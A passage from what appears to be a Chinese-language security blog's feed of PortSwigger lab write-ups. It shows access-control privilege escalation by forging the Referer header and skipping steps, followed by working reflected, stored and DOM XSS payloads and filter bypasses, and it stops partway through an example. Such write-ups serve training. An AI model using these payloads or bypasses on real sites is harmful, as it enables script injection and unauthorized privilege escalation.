<code>action=upgrade&amp;confirmed=true&amp;username=wiener</code>，绕过逻辑：虽然提权需要三步，但执行第三步的时候后端可能会默认前两步成功了，也就是 身份验证为 <code>administrator</code>，并提交了提权请求，所以直接使用 <code>wiener</code> 身份构造第三步的请求包即可提权成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112172848.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112172848.png"></a></p><p>响应报文显示 302 重定向到 <code>/admin</code>，说明提权成功了。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112172920.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112172920.png"></a></p><p>打开网页验证一下。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112173526.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112173526.png"></a></p><p>登录 <code>administrator</code> 面板显示提权成功。<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112173607.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112173607.png"></a></p><h1 id="13-Lab-Referer-based-access-control"><a href="#13-Lab-Referer-based-access-control" class="headerlink" title="13 Lab: Referer-based access control"></a>13 Lab: Referer-based access control</h1><p><a href="https://portswigger.net/web-security/access-control/lab-referer-based-access-control">–&gt; lab</a></p><p>credentials: <code>wiener:peter</code>, <code>administrator:admin</code><br>目标：使用 <code>wiener</code> 登录，并通过 BAC ( break access control ) 将自己提升为 <code>administrator</code> 权限。<br>ps：可以登录 <code>administrator</code> 账号熟悉下提权流程</p><p>与上一个 lab 不同的是，在 admin 管理面板 (admin panel) 直接点击 <code>Upgrade user</code> 即可提权，没有二次检查。</p><p>点击 <code>Upgrade user</code>，抓包，发现使用的是 GET 方法传参，且会验证 <code>Referer</code> 头部 -&gt; 必须从 <code>/admin</code> 页面跳转过来。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112203449.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112203449.png"></a></p><p>修改 <code>Referer</code> 头部<br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112205031.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112205031.png"></a></p><p>响应报文显示 401 “Unauthorized”，说明会验证 <code>Referer</code> 头部</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112205106.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112205106.png"></a></p><p>思路：登录普通用户，使用 GET 方法请求<code>/admin-roles?username=wiener&amp;action=upgrade</code> 并伪造 <code>Referer</code> 头部，使后端服务器认为是从 <code>/admin</code> 跳转过去的。</p><p>登录 <code>wiener</code>，这里直接选择 <code>my-account</code> 页面的报文，主要它用的是 GET 方法。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112204821.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112204821.png"></a></p><p>仅修改请求 url 为 <code>/account-roles?username=wiener&amp;action=upgrade</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112205244.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112205244.png"></a></p><p>响应报错，提示 401 Unauthorized</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112205920.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112205920.png"></a></p><p>同时修改请求 url 和 <code>Referer</code> </p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112210020.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112210020.png"></a></p><p>响应报文提示 302 跳转到 <code>/admin</code> 页面，提权成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112165905.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112165905.png"></a></p><p>刷新页面，显示出 <code>Admin panel</code> 提权成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20240112210149.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20240112210149.png"></a></p>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://by-musi.github.io/tags/access-control/">access_control</category>
      
      
      <comments>https://by-musi.github.io/2024/02/20/PortSwigger_access_control_Labs/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PortSwigger xss labs</title>
      <link>https://by-musi.github.io/2024/02/20/PortSwigger_xss_labs/</link>
      <guid>https://by-musi.github.io/2024/02/20/PortSwigger_xss_labs/</guid>
      <pubDate>Mon, 19 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>[!note] </p><ol><li>Community Solutions 下面的视频质量都很高，可以进一步提高我们对每个 lab 及其知识点的理解，建议看一下。</li><li>payload 可以直接搜，没必要非得自己构造，重要的是学习渗透思路。<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">portswiggerXSScheat-sheet</a>、<a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">owsap cheat-sheet</a></li></ol></blockquote><h1 id="1-Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#1-Lab-Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="1 Lab: Reflected XSS into HTML context with nothing encoded"></a>1 Lab: Reflected XSS into HTML context with nothing encoded</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122232408.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122232408.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122232249.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122232249.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122232332.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122232332.png"></a></p><h1 id="2-Lab-Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#2-Lab-Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="2 Lab: Stored XSS into HTML context with nothing encoded"></a>2 Lab: Stored XSS into HTML context with nothing encoded</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233548.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233548.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233735.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233735.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233822.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233822.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231122233857.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231122233857.png"></a></p><h1 id="3-Lab-DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#3-Lab-DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="3 Lab: DOM XSS in document.write sink using source location.search"></a>3 Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123133807.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123133807.png"></a></p><p><code>ctrl+shift+f</code> 全局搜索 <code>location.search</code>。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135504.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135504.png"></a></p><p>函数 <code>trackSearch()</code> 使用 <code>document.write</code> 在上下两个 section 中写入一个 <code>&lt;img&gt;</code> 标签。<code>location.search</code> 从 url <code>https://0ae0002203c0668a84176d2100500026.web-security-academy.net/?search=1655452184</code>中拿到参数 <code>search</code> 的值并赋值给 <code>query</code>。   GET 方法</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135020.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135020.png"></a></p><p>payload: <code>&quot;&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt; &quot;&lt;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135219.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135219.png"></a></p><p>拿下！</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123135946.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123135946.png"></a></p><p>payload2 <strong>闭合属性</strong>完成 XSS: <code>&quot; onmouseover=alert(/xss/)&quot;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214457.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214457.png"></a><br>img 就一个像素，难以触发 emmm</p><p>重新构造 payload <code>&quot; style=&quot;width:30px;height:30px;background-color:red;&quot; onmouseover=alert(/xss/) &quot;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214215.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214215.png"></a></p><p>鼠标移动到 img 区域，触发 xss。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231128214304.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231128214304.png"></a></p><h1 id="4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#4-Lab-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="4 Lab: DOM XSS in document.write sink using source location.search inside a select element"></a>4 Lab: DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142021.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142021.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142007.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142007.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142209.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142209.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123142335.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123142335.png"></a></p><p>虽然表单使用的是 POST 方法传参，但是根据 js 代码，<code>storeId</code> 是通过 <code>window.location.search</code> 从url 中获取的。（md，用 burp 抓包弄了半天，人傻了）</p><p>请求 url : <code>product?productId=5&amp;storeId=1235134481234</code> </p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123153437.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123153437.png"></a></p><p>payload1: <code>product?productId=5&amp;storeId=1235134481234&lt;/option&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123153659.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123153659.png"></a></p><p>payload2: <code>product?productId=5&amp;storeId=&lt;/select&gt;&lt;img%20src=1%20onerror=alert(/xss/)&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123154043.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123154043.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123154112.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123154112.png"></a></p><h1 id="5-Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#5-Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="5 Lab: DOM XSS in innerHTML sink using source location.search"></a>5 Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123155703.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123155703.png"></a></p><p>js 代码 修改 id 为 ‘searchMessage’ 的标签的 <code>innerHTML</code>。</p><blockquote><p>[!note] 注：<br><code>innerHTML</code> 中无法使用 <code>&lt;script&gt;</code> 标签。</p></blockquote><p>^e1ca4a</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123160034.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123160034.png"></a></p><p>解决方法：使用其他标签，如 <code>&lt;img&gt;</code>，<code>&lt;iframe&gt;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123160228.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123160228.png"></a></p><h1 id="6-Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#6-Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="6 Lab: DOM XSS in jQuery anchor href attribute sink using location.search source"></a>6 Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171205.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171205.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171303.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171303.png"></a></p><p>尝试修改 url，随便改个百度试试 <code>feedback?returnPath=https://www.baidu.com/</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171544.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171544.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123171429.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123171429.png"></a></p><p>跳转成功。</p><p>构造 payload: <code>/feedback?returnPath=javascript:alert(/xss/)</code></p><p>按了回车后，没发现弹窗，考虑了半天，甚至问了 gpt，然后突然意识到，这个 payload 是用来修改右下角 Back 按钮的返回链接的，也就是 <code>&lt;a&gt;</code> 标签的 <code>href</code> 属性。md，又傻逼了。</p><p>有些浏览器会阻止在地址栏使用 <code>javascript:</code> 协议，不过跟这个没啥关系。</p><h1 id="7-Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#7-Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="7 Lab: DOM XSS in jQuery selector sink using a hashchange event"></a>7 Lab: DOM XSS in jQuery selector sink using a hashchange event</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123232127.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123232127.png"></a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + </span><br><span class="line"><span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>分析 js 代码发现，我们可以通过 <code>location.hash</code> 来控制变量 <code>post</code> 的值，进而跳转到相对应的位置。</p><p>测试 url <code>/#21st%20Century%20Dreaming</code>，回车之后跳转到 “21st Century Dreaming” 位置，<code>location.hash</code> 就相当于是锚点 (bookmarking)，实现页面内跳转。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123232417.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123232417.png"></a></p><p>构造 payload url <code>/#&lt;img%20src=&#39;&#39;%20onerror=print(&#39;xss&#39;)&gt;</code> </p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231123232707.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231123232707.png"></a></p><blockquote><p>[!question] 问题<br>咋还是 <strong>unsolved</strong> ？</p><p><strong>答：</strong> 以上操作都算是在自己的浏览器客户端进行的测试 (self cross-site scripting)，类似于 f12 直接修改 html 文件一样。<br>需要寻找一种没有用户交互即可触发 <code>hashchange</code> 事件的方式。</p></blockquote><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124122025.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124122025.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124122048.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124122048.png"></a></p><p>在 <strong>Body</strong> 中编写 payload <code>&lt;iframe src=&quot;https://0a5200b2030523bd80fd1cbe00dd0058.web-security-academy.net/#&quot; onload=&quot;this.src+=&#39;&lt;img src=x onerror=print()&gt;&#39;&quot;&gt;&lt;/iframe&gt;</code></p><p><strong>Store</strong> 然后 <strong>View exploit</strong> 测试</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124121952.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124121952.png"></a></p><p>没问题，成功召唤打印机！</p><h1 id="8-Lab-Reflected-DOM-XSS"><a href="#8-Lab-Reflected-DOM-XSS" class="headerlink" title="8 Lab: Reflected DOM XSS"></a>8 Lab: Reflected DOM XSS</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124152550.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124152550.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124152723.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124152723.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124153236.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124153236.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124153756.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124153756.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124154701.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124154701.png"></a></p><p>可以使用 burp 抓包，观察参数处理的过程。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">responseText</span> = &#123;<span class="string">&quot;results&quot;</span>:[],<span class="string">&quot;searchTerm&quot;</span>:<span class="string">&quot;1655452184&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>构造 payload1: <code>hello\&quot;&#125;; alert(/xss/);//</code></p><p>payload2: <code>\&quot;-alert(1)&#125;//</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124160437.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124160437.png"></a><br>拿下。</p><blockquote><p>[!note]<br>该 lab 转义了 双引号，可以再加一个转义符 <code>\</code> 绕过。</p></blockquote><h1 id="9-Lab-Stored-DOM-XSS"><a href="#9-Lab-Stored-DOM-XSS" class="headerlink" title="9 Lab: Stored DOM XSS"></a>9 Lab: Stored DOM XSS</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124184926.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124184926.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124185126.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124185126.png"></a></p><p>查看源码发现，评论是由 <code>loadComments()</code> 函数生成的。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124185554.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124185554.png"></a></p><p>搜索发现 <code>loadComments()</code> 函数在 <code>resource/js/</code> 目录下 <code>loadCommentsWithVulnerableEscapeHtml.js</code> 文件中定义。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124190423.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124190423.png"></a></p><p>其中 <code>escapeHTML(html)</code> 函数对 “&gt;”，“&lt;” 进行了过滤，除此之外还有大量类似 <code>element.innerHTML = (something you can control)</code> 之类的赋值操作， 如 <code>commentBodyPElement.innerHTML = escapeHTML(comment.body);</code>，存在 XSS 漏洞，其中 <code>comments</code> 是我们可以控制的内容，如下图所示。 </p><p>在 JavaScript 中，<code>.replace()</code> 方法默认只替换字符串中的第一个匹配项。如果想替换所有匹配项，需要使用正则表达式并配合全局匹配标志 <code>g</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">&quot;&lt;&lt;script&gt;&gt;alert(/xss/)&lt;&lt;/script&gt;&quot;</span>.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="language-xml">&lt;. &#x27;<span class="symbol">&amp;lt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span><span class="symbol">&amp;gt;</span>alert(/xss/)<span class="symbol">&amp;lt;</span><span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&#x27;</span></span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124191152.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124191152.png"></a></p><p>构造评论 <code>&lt;sciript&gt;alert(/xss/)&lt;/script&gt;</code>，并没有成功，评论部分还只显示了一半。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124230410.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124230410.png"></a></p><blockquote><p>[!question] 问题<br><code>escapeHTML()</code> 咋绕过呀？</p></blockquote><p>使用 HTML 编码绕过。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124233300.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124233300.png"></a></p><p>构造 payload: <code>&lt;/p&gt;&lt;sciript&gt;alert(/xss/)&lt;/script&gt;</code> 的 HTML 编码  <code>&amp;#x3c;&amp;#x2f;&amp;#x70;&amp;#x3e;&amp;#x3c;&amp;#x73;&amp;#x63;&amp;#x69;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&amp;#x3c;&amp;#x2f;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3e;</code></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124234608.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124234608.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231124235745.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231124235745.png"></a></p><p>然并卵。这里 [[PortSwigger xss labs#^e1ca4a]] 遇见过，忘了，md</p><blockquote><p>[!note]<br>如果将 HTML 实体编码的脚本标签插入到元素的 <code>innerHTML</code> 中，虽然浏览器会解析这些实体为对应的字符并构建 DOM 元素，但出于安全考虑，大多数现代浏览器不会执行通过 <code>innerHTML</code> 添加的 <code>&lt;script&gt;</code> 标签中的 JavaScript 代码。</p></blockquote><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125093721.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125093721.png"></a></p><p>使用 HTML 编码的 <code>&lt;img src=1 onerror=alert(/xss/)&gt;</code> ，仍无法运行。</p><blockquote><p>[!question] 问题<br>使用 <strong>HTML 实体编码的语句</strong>无法执行？</p><p>答：HTML 实体编码的内容不会被浏览器解释为实际的 HTML 标签和属性。<strong>（猜测，仍存疑）</strong></p></blockquote><p>构造 payload: <code>&lt;&gt;&lt;img src=1 onerror=alert(/xss/) /&gt;</code>。如前所述，<code>.replace()</code> 默认只替换第一个匹配项，这个 payload 类似于双写绕过。</p><p>成功。</p><h1 id="10-Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><a href="#10-Lab-Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked" class="headerlink" title="10 Lab: Reflected XSS into HTML context with most tags and attributes blocked"></a>10 Lab: Reflected XSS into HTML context with most tags and attributes blocked</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125101815.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125101815.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125101801.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125101801.png"></a></p><p>过滤了 <code>&lt;script&gt;</code>，<code>&lt;img&gt;</code>，<code>&lt;frame&gt;</code>，<code>&lt;svg&gt;</code> 等等。</p><blockquote><p>[!tip] ideas<br>善用、多用 <strong>burp</strong>！！！<br>我还搁这一个一个找呢，直接用 <strong>burp intrude</strong> 模块看看有哪些标签没被过滤。</p></blockquote><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110242.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110242.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110355.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110355.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110328.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110328.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110603.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110603.png"></a></p><p>只有一个 <code>body</code> 标签未被过滤。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110707.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110707.png"></a><br><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125110829.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125110829.png"></a></p><p>属性也被过滤了，你要这么玩可就没意思了嗷！！</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125111116.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125111116.png"></a></p><p>这里我使用 <code>body</code> 标签和 <code>onresize</code> 事件，payload 可以直接在<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">这里</a>搜。</p><blockquote><p>[!note]<br><code>onresize</code> 事件会在页面大小改变时执行Javascript代码。</p></blockquote><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125112340.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125112340.png"></a></p><p>Search 之后，F12 打开开发者工具改变页面大小，<code>alert()</code> 执行成功。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125112406.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125112406.png"></a></p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125113011.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125113011.png"></a></p><p>payload: <code>&lt;iframe src=&quot;https://0a8d000f0341882a8073769100a400bc.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot; onload=this.style.width=&#39;100px&#39;&gt;</code></p><p><strong>view exploit</strong> 测试一下。</p><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125113147.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125113147.png"></a></p><p><strong>Deliver exploit to victim</strong> 拿下。</p><h1 id="11-Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><a href="#11-Lab-Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones" class="headerlink" title="11 Lab: Reflected XSS into HTML context with all tags blocked except custom ones"></a>11 Lab: Reflected XSS into HTML context with all tags blocked except custom ones</h1><p><a data-fancybox="gallery" data-src="/images/2024/02/20/Pasted_image_20231125124411.png" data-caption=""><img src="/images/2024/02/20/Pasted_image_20231125124411.png"></a></p><p>除了几个自定义标签，其余全被过滤掉了。</p><blockquote><p>[!note] Custom Tags<br>A custom tag is a user-defined JSP language element. </p><p>在HTML中，自定义标签（Custom Tags）是指<strong>开发者自己创建的</strong>、<strong>非HTML标准内置</strong>的标签。这些标签可以用于特定的用途，比如组织页面结构、创建复用的UI组件等。自定义标签是Web组件技术的一部分，它们使得前端代码更模块化、可维护和可重用。 —-ChatGPT</p></blockquote><p>以下是一个自定义标签 <code>&lt;user-card&gt;</code> 的例子。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 